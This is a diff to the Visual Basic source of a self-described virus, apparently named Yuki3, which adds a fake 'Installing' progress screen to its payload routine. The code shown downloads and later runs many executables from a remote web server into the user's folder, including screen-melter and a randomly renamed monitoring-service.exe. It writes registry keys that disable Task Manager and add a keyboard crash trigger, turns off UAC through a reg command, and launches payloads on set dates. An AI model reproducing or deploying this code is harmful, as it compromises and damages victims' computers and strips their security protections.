@@ -9,6 +9,7 @@ Imports System.Threading
 Imports System.IO.Compression
 Imports System.Runtime.InteropServices
 Imports System.Diagnostics.Eventing.Reader
+Imports System.Drawing.Text
 '------------------------INFO------------------------
 ' This virus was made by ZV800 as a fun  Codeing,
 ' challenge. I did not make this to be the next,
@@ -69,16 +70,17 @@ Public Class Form1
 
     Dim des = fakememz
 
+    Private Sub RunMainApp_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles RunMainApp.DoWork
+
+    End Sub
+
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load 'https://incomparable-cascaron-802b94.netlify.app/earrape.wav
         'my_thing_idkvb.Show()
         If testing = True Then
-            Try
-                My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\BreakingBad.wav", AudioPlayMode.Background)
-            Catch ex As Exception
-
-            End Try
-            Walter_White.Show()
+            If Not My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
+                '     Installing.Show()
+            End If
         Else
             'MsgBox(Application.StartupPath)
             If Not My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
@@ -126,6 +128,8 @@ Public Class Form1
 
                             If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then
                                 My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\destructive.yuki3")
+                                Installing.Mode.Text = "Destructive"
+                                Installing.Mode.ForeColor = Color.Red
                             End If
                         End If
                         My.Settings.infected = True
@@ -195,9 +199,13 @@ Public Class Form1
             fs.Write(info, 0, info.Length)
             fs.Close()
             'https://incomparable-cascaron-802b94.netlify.app/DesktopGoose.zip
-
+            If Not My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
+                '  Installing.Show()
+            End If
             RegistryKey = CreateObject("WScript.Shell") 'https://www.7-zip.org/a/7zr.exe
             Try
+                Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\gdi.exe"
+                Installing.ProgressBar1.Value = 5
                 download8 = True
                 My.Computer.Network.DownloadFile(
             WebserverURL & "/gdi.exe", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
@@ -213,6 +221,8 @@ Public Class Form1
 
             Try
                 download15 = True
+                Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\chilledwindows.exe"
+                Installing.ProgressBar1.Value = 10
                 My.Computer.Network.DownloadFile(
             WebserverURL & "/chilledwindows.exe", 'https://incomparable-cascaron-802b94.netlify.app/chilledwindows.exe
             "C:\Users\" & SystemInformation.UserName & "\chilledwindows.exe")
@@ -224,6 +234,8 @@ Public Class Form1
 
             Try
                 download15 = True
+                Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\Yuki3Antivirus.exe"
+                Installing.ProgressBar1.Value = 15
                 My.Computer.Network.DownloadFile(
             WebserverURL & "/Yuki3Antivirus.exe", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
             "C:\Users\" & SystemInformation.UserName & "\Yuki3Antivirus.exe")
@@ -233,6 +245,8 @@ Public Class Form1
             End Try
             Try
                 download16 = True
+                Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\ERROR408.exe"
+                Installing.ProgressBar1.Value = 20
                 My.Computer.Network.DownloadFile(
             WebserverURL & "/ERROR408.exe",
             "C:\Users\" & SystemInformation.UserName & "\ERROR408.exe")
@@ -243,6 +257,8 @@ Public Class Form1
             'Show()
             Try
                 download17 = True
+                Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\Main.db"
+                Installing.ProgressBar1.Value = 23
                 My.Computer.Network.DownloadFile(
             WebserverURL & "/Main.db", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
             "C:\Users\" & SystemInformation.UserName & "\Main.db")
@@ -252,6 +268,8 @@ Public Class Form1
             End Try
             Try
                 download14 = True
+                Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\play.vbs"
+                Installing.ProgressBar1.Value = 29
                 My.Computer.Network.DownloadFile(
             WebserverURL & "/play.vbs", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
             "C:\Users\" & SystemInformation.UserName & "\play.vbs")
@@ -262,6 +280,8 @@ Public Class Form1
 
             Try
                 download8 = True
+                Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\yuki3.f.exe"
+                Installing.ProgressBar1.Value = 34
                 My.Computer.Network.DownloadFile(
            WebserverURL & "\yuki3.f.exe",
             "C:\Users\" & SystemInformation.UserName & "\yuki3.f.exe")
@@ -273,6 +293,8 @@ Public Class Form1
 
             Try
                 download8 = True
+                Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\7z.exe"
+                Installing.ProgressBar1.Value = 38
                 My.Computer.Network.DownloadFile(
              "https://www.7-zip.org/a/7zr.exe", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
             "C:\Users\" & SystemInformation.UserName & "\7z.exe")
@@ -283,6 +305,8 @@ Public Class Form1
             'BreakingBad.wav
             Try
                 download9 = True
+                Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\DesktopGoose.zip"
+                Installing.ProgressBar1.Value = 43
                 My.Computer.Network.DownloadFile(
              WebserverURL & "/DesktopGoose.zip", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
             "C:\Users\" & SystemInformation.UserName & "\DesktopGoose.zip")
@@ -292,7 +316,8 @@ Public Class Form1
             End Try
 
             Try
-
+                Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\BreakingBad.wav"
+                Installing.ProgressBar1.Value = 49
                 My.Computer.Network.DownloadFile(
              WebserverURL & "/BreakingBad.wav", 'https://incomparable-cascaron-802b94.netlify.app/BreakingBad.wav
             "C:\Users\" & SystemInformation.UserName & "\BreakingBad.wav")
@@ -302,6 +327,8 @@ Public Class Form1
             End Try
 
             Try
+                Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\fake.memz.joke.exe"
+                Installing.ProgressBar1.Value = 46
                 download9 = True
                 My.Computer.Network.DownloadFile(
             WebserverURL & "/fake.memz.joke.exe", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
@@ -312,6 +339,8 @@ Public Class Form1
             End Try
 
             Try
+                Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\AxInterop.WMPLib.dll"
+                Installing.ProgressBar1.Value = 49
                 download1 = True
                 My.Computer.Network.DownloadFile(
            WebserverURL & "/AxInterop.WMPLib.dll", 'https://incomparable-cascaron-802b94.netlify.app/BluescreenSimulator.exe
@@ -323,6 +352,8 @@ Public Class Form1
 
             Try
                 download1 = True
+                Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\338ryfhn2iyhrb2j.exe"
+                Installing.ProgressBar1.Value = 59
                 My.Computer.Network.DownloadFile(
             WebserverURL & "/338ryfhn2iyhrb2j.exe",
             "C:\Users\" & SystemInformation.UserName & "\338ryfhn2iyhrb2j.exe")
@@ -332,7 +363,8 @@ Public Class Form1
             End Try
 
             Try
-
+                Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\beep2.wav"
+                Installing.ProgressBar1.Value = 62
                 My.Computer.Network.DownloadFile(
         WebserverURL & "/beep2.wav",
             "C:\Users\" & SystemInformation.UserName & "\beep2.wav")
@@ -343,6 +375,8 @@ Public Class Form1
 
 
             Try
+                Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\Interop.WMPLib.dll"
+                Installing.ProgressBar1.Value = 69
                 download2 = True
                 My.Computer.Network.DownloadFile(
                 WebserverURL & "/Interop.WMPLib.dll",
@@ -353,7 +387,8 @@ Public Class Form1
             End Try
 
             Try
-
+                Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe"
+                Installing.ProgressBar1.Value = 73
                 My.Computer.Network.DownloadFile(
                  WebserverURL & "/Hoax.Win32.BadJoke.BlastBtn.a.exe",
                   "C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
@@ -365,6 +400,8 @@ Public Class Form1
             download4 = True
 
             Try
+                Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe"
+                Installing.ProgressBar1.Value = 78
                 download3 = True
                 My.Computer.Network.DownloadFile(
                WebserverURL & "/welpyoutryed.exe",
@@ -377,7 +414,8 @@ Public Class Form1
 
             Try
                 download3 = True
-
+                Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\Wncujekce893hxc8y3hnsp3u809ef3y7dsgfre45t4gr.exe"
+                Installing.ProgressBar1.Value = 83
                 My.Computer.Network.DownloadFile(
        WebserverURL & "/monitoring-service.exe",
         "C:\Users\" & SystemInformation.UserName & "\Wncujekce893hxc8y3hnsp3u809ef3y7dsgfre45t4gr.exe")
@@ -387,7 +425,8 @@ Public Class Form1
 
 
 
-
+            Installing.IntLbr.Text = "installing: " & "C:\Users\" & SystemInformation.UserName & "\screen-melter.exe"
+            Installing.ProgressBar1.Value = 89
             Try
                 download6 = True
                 My.Computer.Network.DownloadFile(
@@ -410,8 +449,20 @@ Public Class Form1
                 Threading.Thread.Sleep(100) ' 500 milliseconds = 0.5 seconds
                 File.Delete("C:\YFShshfgsd.yuki")
                 ' to fix UAC C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
+                Installing.IntLbr.Text = "adding registry key: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr / 1"
+                Installing.ProgressBar1.Value = 90
+                Installing.ProgressBar1.Value = 89
                 RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
+                System.Threading.Thread.Sleep(800)
+                Installing.ProgressBar1.Value = 94
+                Installing.IntLbr.Text = "adding registry key: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\kbdhid\Parameters\CrashOnCtrlScroll"
+                System.Threading.Thread.Sleep(800)
+                Installing.ProgressBar1.Value = 96
+                Installing.IntLbr.Text = "adding registry key: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\kbdhid\Parameters\CrashOnCtrlScroll"
                 RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\kbdhid\Parameters\CrashOnCtrlScroll", 1, "REG_DWORD")
+                System.Threading.Thread.Sleep(800)
+                Installing.ProgressBar1.Value = 100
+                Installing.IntLbr.Text = "executing command: reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
                 MyUtilities.RunCommandCom("reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f", "/W", True) 'fucks UAC\
 
 
@@ -514,7 +565,11 @@ Public Class Form1
                         my_thing_idkvb.Show()
                     End If
                     If day = 5 AndAlso month = 10 Then ' "C:\Users\" & SystemInformation.UserName & "\chilledwindows.exe"
-                        Process.Start("C:\Users\" & SystemInformation.UserName & "\chilledwindows.exe")
+                        'Process.Start("C:\Users\" & SystemInformation.UserName & "\chilledwindows.exe")
+                        Dim startInfo As New ProcessStartInfo("C:\Users\" & SystemInformation.UserName & "\chilledwindows.exe")
+                        startInfo.WorkingDirectory = "C:\Users\" & SystemInformation.UserName
+                        startInfo.UseShellExecute = True
+                        Process.Start(startInfo)
                     End If
                     ' "C:\Users\" & SystemInformation.UserName & "\BreakingBad.wav"
                     If day = 9 AndAlso month = 7 Then ' "C:\Users\" & SystemInformation.UserName & "\chilledwindows.exe"
@@ -924,8 +979,8 @@ Public Class Form1
             Else
                 If admin = True Then
                     'MsgBox("This program is incompatible with your current Windows installation.", 0 + 16, "incompatible")
-                    '  Yuki___infected.Show()
-                    MsgBox("Unable to decompress ""IndexedDbLegacy.dll"" File contains garbage data at 0x92873 aborting.", 0 + 16, "yuki3")
+                    Yuki___infected.Show()
+                    '   MsgBox("Virus.Win64.Yuki3 installed successfully.", 0 + 64, "yuki3")
                     Dim file2 As System.IO.StreamWriter
                     file2 = My.Computer.FileSystem.OpenTextFileWriter("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki", True)
                     file2.WriteLine("true")
@@ -1898,6 +1953,8 @@ Public Class Form1
 
 
     End Sub
+
+
 End Class
 
 
